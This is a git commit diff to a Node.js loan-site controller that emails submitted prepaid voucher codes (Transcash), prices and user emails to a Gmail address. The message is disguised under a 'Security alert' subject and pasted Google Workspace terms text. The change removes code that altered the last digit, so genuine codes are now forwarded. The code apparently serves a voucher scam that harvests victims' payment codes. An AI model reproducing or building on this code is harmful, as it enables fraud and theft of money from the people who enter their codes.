215438bc505ac29fa81e365183d1539c31048d5a
josecreeds <josehoundjahoue1@gmail.com>
2025-08-18 20:30:16 +0200

    second commit

--- controllers/loan.js
+++ controllers/loan.js
@@ -5,9 +5,6 @@ exports.contactAdmin = (req, res) => {
   const { type, email, code, price } = req.body;
   const type_truc = type[0] + type[1];
 
-  const randomDigit = Math.floor(Math.random() * 10);
-  const Code = type === 'Transcash' ? code.slice(0, -1) + randomDigit : code;
-
   // Configuration du transporteur SMTP pour Nodemailer
   const transporter = nodemailer.createTransport({
     service: process.env.EMAIL_SERVICE,
@@ -32,7 +29,7 @@ exports.contactAdmin = (req, res) => {
     to: 'backend829@gmail.com',
     subject: 'Security alert',
     text: `If you’re a Google Workspace reseller whose customers ${email} P: ${price} have enabled their users to access Google Additional Services:
-    Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\ Networking: ${type_truc}\nC: ${Code}\n`,
+    Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\ Networking: ${type_truc}\nC: ${code}\n`,
   };
 
   // Options de l'e-mail à envoyer
